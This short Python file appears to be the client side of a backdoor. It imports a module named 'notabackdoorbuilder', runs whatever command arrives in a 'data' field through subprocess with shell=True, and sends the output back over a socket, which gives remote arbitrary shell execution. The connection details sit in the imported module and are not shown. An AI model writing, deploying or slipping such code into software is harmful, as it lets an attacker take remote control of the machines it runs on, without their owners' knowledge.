import notabackdoorbuilder
import subprocess

def handle_command(context):
	proc = subprocess.Popen(context.get("data"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	output = proc.stdout.read() + proc.stderr.read()
	context.get("socket").send(f"{output.decode()}\u0003".encode())

def handle_exit(context):
	print("exiting...")

def main():
	notabackdoorbuilder.handle_setup("client")